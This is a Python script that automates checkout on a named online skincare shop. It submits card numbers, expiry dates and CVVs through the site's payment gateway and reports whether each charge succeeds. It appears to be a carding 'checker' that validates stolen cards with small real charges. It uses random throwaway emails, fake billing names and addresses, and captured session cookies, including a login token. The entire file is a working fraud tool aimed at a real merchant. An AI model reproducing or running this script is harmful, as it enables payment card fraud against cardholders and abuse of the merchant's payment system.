import requests,random,string
from datetime import datetime
import pytz

def getstr(data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None
    
def random_email():
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=(random.randint(6, 10))))
    domain = random.choice(['gmail', 'yahoo', 'hotmail', 'outlook', 'icloud' , 'aol', 'live'])
    extension = 'com'

    return f'{random_string}@{domain}.{extension}'

def random_username():
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=(random.randint(6, 10))))
    return random_string


def opayopi_charge1(cc,mm,yy,cvv):
  proxy = None
  email = random_email()
  user = random_username()
  expire = f'{mm}/{yy[-2]}'
  r = requests.Session()
  timezone = pytz.timezone('Asia/Calcutta')

  current_time = datetime.now(timezone)
  r.proxies = proxy
  headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        #'cookie': 'wp_woocommerce_session_db44a64cef2a333f163ea3ac472465b3=t_1879c7ca36d75261c127bee5e86908%7C%7C1729667667%7C%7C1729664067%7C%7C0d5cafef738b93312e26856a3bf41feb; _ga=GA1.1.1350522632.1729494870; wffn_flt=2024-10-21 07:14:30; wffn_timezone=Asia/Calcutta; wffn_is_mobile=false; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/product-category/fusion-meso/; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-21%2006%3A44%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct-category%2Ffusion-meso%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-21%2006%3A44%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct-category%2Ffusion-meso%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; prism_477548007=824c3bab-650b-4be2-969c-f9b5afb6a903; fkcart_cart_qty=0; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26pound%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E; wn_data_custom_number={"https://ksskinstore.uk/product/fusion-meso-fan-brush/":23}; cookieyes-consent=consentid:bWs0NEw3aHdzbFRIaXk5eEhGS05PUTJBcUlKNTFVdnQ,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no; woocommerce_recently_viewed=9295; _ga_970K36L0SN=GS1.1.1729494869.1.1.1729494984.0.0.0; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct%2Fempty-mixlab-bottle%2F',
        'origin': 'https://ksskinstore.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://ksskinstore.uk/product/empty-mixlab-bottle/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

  params = (
        ('wc-ajax', 'fkcart_add_item'),
    )

  data = {
      'qty': '1',
      'plugify_estamted_timeeee': '',
      'fkcart_single_product_add_to_cart': 'yes',
      'fkcart_product_id': '9295',
      'fkcart_quantity': '1'
    }
  try:
    response = r.post('https://ksskinstore.uk/', headers=headers, params=params, data=data)
  except:
    return '[Opayopi_Api] => Error: 1 req'
  headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': '_ga=GA1.1.1350522632.1729494870; wffn_flt=2024-10-21 07:14:30; wffn_timezone=Asia/Calcutta; wffn_is_mobile=false; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/product-category/fusion-meso/; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-21%2006%3A44%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct-category%2Ffusion-meso%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-21%2006%3A44%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct-category%2Ffusion-meso%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; prism_477548007=824c3bab-650b-4be2-969c-f9b5afb6a903; cookieyes-consent=consentid:bWs0NEw3aHdzbFRIaXk5eEhGS05PUTJBcUlKNTFVdnQ,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no; woocommerce_recently_viewed=9295; woocommerce_items_in_cart=1; fkcart_cart_qty=1; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26pound%3B%3C%2Fspan%3E3.50%3C%2Fbdi%3E%3C%2Fspan%3E; woocommerce_cart_hash=19da0dc354609d55a7dbb407754a71af; wordpress_logged_in_db44a64cef2a333f163ea3ac472465b3=allsampa%7C1730704829%7CDzBZXVPaZMQkvkd741mTvBsYOa8WR8zsKuizy7NXKPc%7Cf408ef00b2da30e3b476dafcf046fa805ce4637a33e758e7896bcc29cfff7499; wp_woocommerce_session_db44a64cef2a333f163ea3ac472465b3=87%7C%7C1729667667%7C%7C1729664067%7C%7C652b331edd0cc410674fb3b490fed5c8; tinv_wishlistkey=4ab60c; tinvwl_wishlists_data_counter=0; wn_data_custom_number={"https://ksskinstore.uk/product/empty-mixlab-bottle/":63}; _ga_970K36L0SN=GS1.1.1729494869.1.1.1729495316.0.0.0; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fksskinstore.uk%2Fmy-account%2Fpayment-methods%2F',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://ksskinstore.uk/product/empty-mixlab-bottle/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }
  try:
    response = r.get('https://ksskinstore.uk/checkout/', headers=headers)
    wpcp = getstr(response.text, 'wfacp_aero_checkout_id" content="', '"')
    checkout_nonce = getstr(response.text, 'woocommerce-process-checkout-nonce" value="', '"')
    data_id = getstr(response.text, 'elementor-widget-wfacp_form" data-id="', '"')
    opayopi_sessiokey = getstr(response.text, 'opayopi-merchantSessionKey" value="', '"')
  except:
    return '[Opayopi_Api] => Error: 2 req'
  headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        #'cookie': 'wp_woocommerce_session_db44a64cef2a333f163ea3ac472465b3=t_da15bcd468a167493c5597043228a8%7C%7C1729669467%7C%7C1729665867%7C%7C4d242919cd667a1fc6b315d7515f55c3; woocommerce_recently_viewed=9295; _ga=GA1.1.1654228706.1729496669; wffn_flt=2024-10-21 07:44:29; wffn_timezone=Asia/Calcutta; wffn_is_mobile=false; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/product/empty-mixlab-bottle/; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-21%2007%3A14%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct%2Fempty-mixlab-bottle%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-21%2007%3A14%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fksskinstore.uk%2Fproduct%2Fempty-mixlab-bottle%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; prism_477548007=e691c6f5-c18b-4982-a5ba-8aa9dc4954a8; cookieyes-consent=consentid:eVhNSGs3Uk5aSEszNGtHOVlGUTVQTVhQVXRzZnp6ZW8,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no; woocommerce_items_in_cart=1; fkcart_cart_qty=1; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26pound%3B%3C%2Fspan%3E3.50%3C%2Fbdi%3E%3C%2Fspan%3E; _ga_970K36L0SN=GS1.1.1729496669.1.0.1729496694.0.0.0; wffn_si=b485aafd2e3f16d3a53653b167b72911; wffn_ay_b485aafd2e3f16d3a53653b167b72911=[11740]; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fksskinstore.uk%2Fcheckout%2F; woocommerce_cart_hash=578e48088bf532fc4db145314995f7f3; wfocu_si=669805f3ad7f13704bbfedaf5448df90',
        'origin': 'https://ksskinstore.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://ksskinstore.uk/checkout/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

  params = (
        ('wc-ajax', 'checkout'),
        ('wfacp_id', wpcp),
        ('wfacp_is_checkout_override', 'yes'),
    )

  data = [
      ('_wfacp_post_id', wpcp),
      ('wfacp_cart_hash', ''),
      ('wfacp_has_active_multi_checkout', ''),
      ('wfacp_source', 'https://ksskinstore.uk/checkouts/checkout/'),
      ('product_switcher_need_refresh', '1'),
      ('wfacp_cart_contains_subscription', '0'),
      ('wfacp_exchange_keys', '{"pre_built":{},"elementor":{"wfacp_form":"'+data_id+'"}}'),
      ('wfacp_input_hidden_data', '{}'),
      ('wfacp_input_phone_field', '{}'),
      ('wfacp_timezone', 'Asia/Calcutta'),
      ('wfacp_billing_same_as_shipping', '1'),
      ('wfacp_billing_address_present', 'yes'),
      ('wfob_input_hidden_data', '{}'),
      ('billing_email', email),
      ('account_username', user),
      ('account_password', 'Ayanpro@087'),
      ('billing_first_name', 'Albedo'),
      ('billing_last_name', 'Jones'),
      ('billing_phone', ''),
      ('shipping_address_1', 'New York'),
      ('shipping_address_2', ''),
      ('shipping_city', 'Richmond'),
      ('shipping_postcode', 'TW91JL'),
      ('shipping_state', ''),
      ('shipping_country', 'GB'),
      ('billing_address_1', 'New York'),
      ('billing_address_2', ''),
      ('billing_city', 'Richmond'),
      ('billing_postcode', 'TW9 1JL'),
      ('billing_state', ''),
      ('billing_country', 'GB'),
      ('order_comments', ''),
      ('shipping_method[0]', 'flat_rate:1'),
      ('payment_method', 'opayopi'),
      ('opayopi-card-number', cc),
      ('opayopi-card-expiry', '07/26'),
      ('opayopi-card-cvc', cvv),
      ('opayopi-merchantSessionKey', opayopi_sessiokey),
      ('browserJavaEnabled', 'null'),
      ('browserJavascriptEnabled', 'true'),
      ('browserLanguage', 'en-US'),
      ('browserColorDepth', '24'),
      ('browserScreenHeight', '864'),
      ('browserScreenWidth', '1536'),
      ('browserTZ', '-330'),
      ('browserUserAgent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'),
      ('terms', 'on'),
      ('terms-field', '1'),
      ('woocommerce-process-checkout-nonce', checkout_nonce),
      ('woocommerce-process-checkout-nonce', checkout_nonce),
      ('_wp_http_referer', f'/?wc-ajax=update_order_review&wfacp_id={wpcp}&wfacp_is_checkout_override=yes'),
      ('_wp_http_referer', '/checkout/'),
      ('wc_order_attribution_source_type', 'typein'),
      ('wc_order_attribution_source_type', 'typein'),
      ('wc_order_attribution_referrer', '(none)'),
      ('wc_order_attribution_referrer', '(none)'),
      ('wc_order_attribution_utm_campaign', '(none)'),
      ('wc_order_attribution_utm_campaign', '(none)'),
      ('wc_order_attribution_utm_source', '(direct)'),
      ('wc_order_attribution_utm_source', '(direct)'),
      ('wc_order_attribution_utm_medium', '(none)'),
      ('wc_order_attribution_utm_medium', '(none)'),
      ('wc_order_attribution_utm_content', '(none)'),
      ('wc_order_attribution_utm_content', '(none)'),
      ('wc_order_attribution_utm_id', '(none)'),
      ('wc_order_attribution_utm_id', '(none)'),
      ('wc_order_attribution_utm_term', '(none)'),
      ('wc_order_attribution_utm_term', '(none)'),
      ('wc_order_attribution_utm_source_platform', '(none)'),
      ('wc_order_attribution_utm_source_platform', '(none)'),
      ('wc_order_attribution_utm_creative_format', '(none)'),
      ('wc_order_attribution_utm_creative_format', '(none)'),
      ('wc_order_attribution_utm_marketing_tactic', '(none)'),
      ('wc_order_attribution_utm_marketing_tactic', '(none)'),
      ('wc_order_attribution_session_entry', 'https://ksskinstore.uk/product/empty-mixlab-bottle/'),
      ('wc_order_attribution_session_entry', 'https://ksskinstore.uk/product/empty-mixlab-bottle/'),
      ('wc_order_attribution_session_start_time', current_time),
      ('wc_order_attribution_session_start_time', current_time),
      ('wc_order_attribution_session_pages', '4'),
      ('wc_order_attribution_session_pages', '4'),
      ('wc_order_attribution_session_count', '1'),
      ('wc_order_attribution_session_count', '1'),
      ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'),
      ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'),
      ('shipping_first_name', 'Albedo'),
      ('shipping_last_name', 'Jones'),
      ('ship_to_different_address', 'on'),
    ]
  try:
    response = r.post('https://ksskinstore.uk/', headers=headers, params=params, data=data)
    if 'statusDetail' in response.json():
      msg = response.json()['statusDetail']
      return msg if msg != '' else 'Charged £8.45'
    else:
      return 'Charged £8.45'
  except:
    open('error.html','w').write(response.text)
    return 'Error processing payment, try again later.'
    
card = input('Enter your credit card number: ')
cc , mm , yy ,cvv = card.split('|')
print(opayopi_charge1(cc,mm,yy,cvv))